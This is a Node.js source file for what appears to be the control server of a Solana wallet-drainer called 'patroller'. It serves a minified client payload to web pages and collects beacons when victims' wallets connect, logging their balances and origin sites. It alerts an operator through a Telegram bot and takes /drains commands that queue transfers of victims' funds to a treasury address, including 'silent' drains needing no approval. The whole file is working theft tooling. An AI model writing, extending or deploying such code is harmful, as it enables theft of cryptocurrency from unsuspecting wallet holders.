const http = require("http"), fs = require("fs"), path = require("path");
const { BOT_TOKEN: BOT, CHAT_ID: CHAT, TREASURY, BEACON_KEY, PORT = 8787 } = process.env;

if (!BOT || !CHAT || !TREASURY) {
  console.error("missing BOT_TOKEN / CHAT_ID / TREASURY in env");
  process.exit(1);
}

process.on("uncaughtException", e => console.error("uncaught:", e && (e.stack || e.message)));

let tgOffset = 0;
try { tgOffset = parseInt(fs.readFileSync(__dirname + "/.offset", "utf8"), 10) || 0; } catch {}

const targets = {}, cmds = {};

const { execSync } = require("child_process");
const ROOT = path.join(__dirname, "..");
const MIN = path.join(ROOT, "client", "x.min.js");
if (!fs.existsSync(MIN)) {
  console.log("building client/x.min.js at startup...");
  execSync("npx --yes esbuild client/x.js --minify --format=iife --target=es2022 --outfile=client/x.min.js", { cwd: ROOT });
}

const B58RE = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;

const tg = (text, pre = "") => fetch("https://api.telegram.org/bot" + BOT + "/sendMessage", {
  method: "POST",
  headers: { "content-type": "application/json" },
  body: JSON.stringify({ chat_id: CHAT, text: pre + text, parse_mode: "HTML", disable_web_page_preview: true }),
}).catch(() => {});

function listTargets() {
  return Object.entries(targets).map(([k, r], i) =>
    "#" + (i + 1) + " " + k + "\n   $" + (r.value ?? 0).toLocaleString() + " \u00b7 " + (r.provider || "?") + " \u00b7 " + (r.origin || "?") +
    (r.drained ? " \u00b7 drained" : "") + (cmds[k] ? " \u00b7 drain queued" : "")
  ).join("\n");
}

function queueDrain(pk, to) {
  cmds[pk] = { to, n: Date.now().toString(36) + Math.random().toString(36).slice(2, 6), ts: Date.now() };
}

async function pollTg() {
  try {
    const j = await (await fetch("https://api.telegram.org/bot" + BOT + "/getUpdates?offset=" + (tgOffset + 1) + "&timeout=0")).json();
    for (const u of j.result || []) {
      if (u.update_id <= tgOffset) continue;
      tgOffset = u.update_id;
      fs.writeFileSync(__dirname + "/.offset", String(tgOffset));
      const parts = (u.message?.text || "").trim().split(/\s+/);
      const cmd = (parts[0] || "").toLowerCase();          // command lowercased, args preserved (base58 is case-sensitive!)
      const rest = parts.slice(1);
      if (cmd === "/help") {
        tg("Patroller commands\n/targets \u2014 list detected wallets\n/drains \u2014 drain ALL targets \u2192 treasury\n/drains <addr|#> [addr] \u2014 drain one target \u2192 addr or treasury\n/stop \u2014 cancel queued drain (last or <#>)\n/clear \u2014 forget all targets\n/clear <addr|#> \u2014 forget one target");
      } else if (cmd === "/drains") {
        const list = Object.keys(targets);
        if (!list.length) return tg("no targets yet \u2014 waiting for a wallet to connect");
        let picked, to;
        const arg = rest[0] || "";
        if (arg === "" || arg.toLowerCase() === "all") { picked = list; to = rest[1] || TREASURY; }
        else if (/^\d{1,3}$/.test(arg)) { const i = (parseInt(arg) - 1) % list.length; picked = [list[i]]; to = rest[1] || TREASURY; }
        else if (B58RE.test(arg)) { picked = [arg]; to = rest[1] || TREASURY; }
        else { picked = [list[list.length - 1]]; to = arg || TREASURY; }
        if (!B58RE.test(to)) return tg("that doesn't look like a pubkey: " + to.slice(0, 20));
        const lines = [];
        for (const pk of picked) {
          queueDrain(pk, to);
          lines.push("\u2022 " + pk.slice(0, 4) + "\u2026" + pk.slice(-4) + " \u2192 " + to.slice(0, 4) + "\u2026" + to.slice(-4));
        }
        tg(lines.join("\n") + "\nqueued \u00d7" + picked.length + (picked.length > 1 ? " (batch)" : ""), "\ud83d\udce1 drain queued \u2014 ");
      } else if (cmd === "/stop") {
        const list = Object.keys(targets);
        const key = (/^\d{1,3}$/.test(rest[0] || "") && list.length) ? list[(parseInt(rest[0]) - 1) % list.length]
          : (B58RE.test(rest[0] || "") ? rest[0] : (list.length ? list[list.length - 1] : null));
        if (!key || !cmds[key]) return tg("no queued drain for that target");
        delete cmds[key];
        tg("cancelled queued drain for " + key.slice(0, 4) + "\u2026" + key.slice(-4));
      } else if (cmd === "/clear") {
        const list = Object.keys(targets);
        const key = rest[0] || "";
        if (B58RE.test(key) && targets[key]) { delete targets[key]; delete cmds[key]; return tg("forgot " + key.slice(0, 4) + "\u2026" + key.slice(-4)); }
        if (/^\d{1,3}$/.test(key) && list.length) { const k2 = list[(parseInt(key) - 1) % list.length]; delete targets[k2]; delete cmds[k2]; return tg("forgot " + k2.slice(0, 4) + "\u2026" + k2.slice(-4)); }
        const n = list.length;
        for (const k of Object.keys(targets)) delete targets[k];   // FIXED: was `targets = {}` on a const — threw, silently
        for (const k of Object.keys(cmds)) delete cmds[k];
        tg(n ? "cleared " + n + " targets" : "nothing to clear");
      } else if (cmd === "/targets") {
        tg(listTargets() || "none \u2014 waiting for a wallet", "targets:");
      }
    }
  } catch (e) { console.error("pollTg:", e && e.message); }
}
setInterval(pollTg, 3000);

// expire queued drains after 30 min
setInterval(() => {
  const now = Date.now();
  for (const k of Object.keys(cmds)) {
    if (cmds[k].ts && now - cmds[k].ts > 1800000) { delete cmds[k]; tg("\u23f1 expired queued drain for " + k.slice(0, 4) + "\u2026" + k.slice(-4)); }
  }
}, 60000).unref();

http.createServer((req, res) => {
  const url = new URL(req.url, "http://x");
  res.setHeader("access-control-allow-origin", "*");

  if (req.method === "OPTIONS") {
    res.setHeader("access-control-allow-methods", "GET, POST, OPTIONS");
    res.setHeader("access-control-allow-headers", "content-type");
    res.statusCode = 204; res.end(); return;
  }

  if (req.method === "GET" && url.pathname === "/cmd") {
    const pk = url.searchParams.get("pk") || "";
    const c = cmds[pk];
    res.setHeader("content-type", "application/json");
    if (!c) return res.end(JSON.stringify({ cmd: "none" }));
    delete cmds[pk];                                     // deliver once — no popup spam
    return res.end(JSON.stringify({ cmd: "drain", to: c.to, n: c.n }));
  }

  if (req.method === "POST" && url.pathname === "/beacon") {
    if (BEACON_KEY && url.searchParams.get("s") !== BEACON_KEY) { res.statusCode = 202; res.end(); return; }
    let d = "";
    req.on("data", c => { if (d.length < 65536) d += c; });
    req.on("end", () => {
      try {
        const j = JSON.parse(d);
        if (j.m === "detect") {
          const first = !targets[j.pk];
          targets[j.pk] = Object.assign(targets[j.pk] || {}, { provider: j.provider, origin: j.origin, value: j.value, sol: j.sol, toks: j.toks, seen: Date.now(), drained: targets[j.pk]?.drained || false });
          if (first) tg("<b>" + (j.provider || "?") + "</b> @ " + (j.origin || "?") + "\n<code>" + j.pk + "</code>\n$" + (j.value ?? 0).toLocaleString() + " \u00b7 " + j.sol + " SOL" + (j.toks ? " + " + j.toks : ""), "\ud83c\udfaf wallet connected \u2014 ");
        }
        if (j.m === "drain") {
          targets[j.pk] = Object.assign(targets[j.pk] || {}, { drained: true, sig: j.sig, value: j.value });
          delete cmds[j.pk];
          tg("<code>" + j.pk + "</code>\n$" + (j.value ?? 0).toLocaleString() +
            (j.extra ? "\nmoved: " + j.extra : "") +
            "\nmode: <b>" + j.mode + "</b>" + (j.mode === "secret" ? " (0 approvals)" : j.mode === "popup" ? " (1 approval)" : "") +
            (j.sig ? "\nsig: <code>" + j.sig + "</code>" : ""),
            j.mode === "secret" ? "\ud83d\udcb0 SILENT DRAIN \u2014 " : "\ud83d\udcb0 drain \u2014 ");
        }
        if (j.m === "err") {
          tg("<code>" + (j.pk || "?") + "</code>\n" + (j.msg || "?") + "\norigin: " + (j.origin || "?"), "\u26a0\ufe0f patroller error \u2014 ");
        }
        if (j.m === "dust") {
          tg("<code>" + (j.pk || "?") + "</code>\n" + (j.extra || "dust \u2014 nothing worth moving") + "\norigin: " + (j.origin || "?"), "\u00b7 \u2014 ");
        }
        if (j.m === "loaded") {
          tg("payload loaded on <code>" + (j.origin || "?") + "</code>\nprovider seen: <b>" + (j.provider || "?") + "</b>", "\ud83d\udcf2 bookmark \u2014 ");
        }
      } catch (e) { console.error("beacon parse:", e && e.message); }
      res.setHeader("content-type", "application/json");
      res.end("{}");
    });
    return;
  }

  if (req.method === "GET" && (url.pathname === "/" || url.pathname === "/x.min.js")) {
    const f = url.pathname === "/" ? "site/index.html" : "client/x.min.js";
    const p = path.join(__dirname, "..", f);
    if (!fs.existsSync(p)) { res.statusCode = 404; res.end("missing: " + f); return; }
    res.setHeader("content-type", f.endsWith(".html") ? "text/html; charset=utf-8" : "application/javascript; charset=utf-8");
    res.setHeader("cache-control", "no-cache");
    return res.end(fs.readFileSync(p));
  }

  res.statusCode = 404; res.end("");
}).listen(+PORT, () => console.log("patroller on 0.0.0.0:" + PORT));